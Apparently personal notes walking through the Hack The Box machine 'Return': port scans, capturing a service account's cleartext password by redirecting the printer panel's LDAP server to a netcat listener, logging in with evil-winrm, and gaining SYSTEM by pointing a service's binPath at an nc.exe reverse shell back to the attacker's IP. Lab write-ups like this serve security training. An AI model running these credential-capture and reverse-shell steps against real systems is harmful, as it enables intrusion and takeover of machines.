Return IP:10.10.11.108

rustscan:
PORT      STATE SERVICE        REASON

53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49674/tcp open  unknown          syn-ack
49675/tcp open  unknown          syn-ack
49679/tcp open  unknown          syn-ack
49682/tcp open  unknown          syn-ack
49694/tcp open  unknown          syn-ack
52898/tcp open  unknown          syn-ack



nmap:

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-01-30 15:34:27Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack Microsoft Windows RPC
49682/tcp open  msrpc         syn-ack Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack Microsoft Windows RPC
52898/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 18m34s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 56639/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 31931/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 26260/udp): CLEAN (Timeout)
|   Check 4 (port 3767/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-01-30T15:35:25
|_  start_date: N/A



visiting the page on port 80, and going to the settings page, we have this

http://10.10.11.108/settings.php

Settings


Server Address : printer.return.local	
Server Port : 389	
Username 	svc-printer
Password 	:*******

Update

we cannot reax the password

but we can make changes to this

let's change the server address to out ip and see what is happening . add the ip address to the server address , start a nc listener on 389 and press update


sudo nc -lvnp 389                 
[sudo] password for kali: 
listening on [any] 389 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.108] 61286
0*`%return\svc-printer�
                       1edFg43012!!


we have something that looks like a passwd

let's use crackmapexec to see if the pass is usable for smb

rackmapexec smb 10.10.11.108 -u svc-printer -p '1edFg43012!!'                                                                                                                               1 ⨯
SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 


Seems that the password and username combination is working

COOL

WinRM is working on the machine, let's try to see if we can log in using the credentials above

crackmapexec winrm 10.10.11.108 -u svc-printer -p '1edFg43012!!'
WINRM       10.10.11.108    5985   PRINTER          [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)
WINRM       10.10.11.108    5985   PRINTER          [*] http://10.10.11.108:5985/wsman
WINRM       10.10.11.108    5985   PRINTER          [-] return.local\svc-printer:1edFg43012!! "unsupported hash type md4"


seems that it works, let's use evil-vinrm in order to log in to the machine
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-printer\Documents> 


Holly shit, it works :D

USER FLAG:94db4e03b7a65ffab66e2c2689fff821

PRIVESC:

enumerate svc-printer

*Evil-WinRM* PS C:\Users\svc-printer\Desktop> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 12:15:13 AM
Password expires             Never
Password changeable          5/27/2021 12:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/26/2021 12:39:29 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.


svc-printer is part of the server operators. This means it can start and stop services.

let's upload nc.exe to the machine. First cd to Documents forlder then use this command to uplopad nc.exe to the victim machine: upload /usr/share/windows-resources/binaries/nc.exe

*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload /usr/share/windows-resources/binaries/nc.exe
Info: Uploading /usr/share/windows-resources/binaries/nc.exe to C:\Users\svc-printer\Documents\nc.exe

                                                             
Data: 79188 bytes of 79188 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-printer\Documents> dir


    Directory: C:\Users\svc-printer\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/30/2023   7:51 AM          59392 nc.exe



start a listener on attacking machine

nc -lvnp 1234




*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.14 1234"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

*Evil-WinRM* PS C:\Users\svc-printer\Documents> 

 nc -lnvp 1234       
listening on [any] 1234 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.108] 63802
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system


root flag: d74e9b81bf5242d140385d7ce32a0026




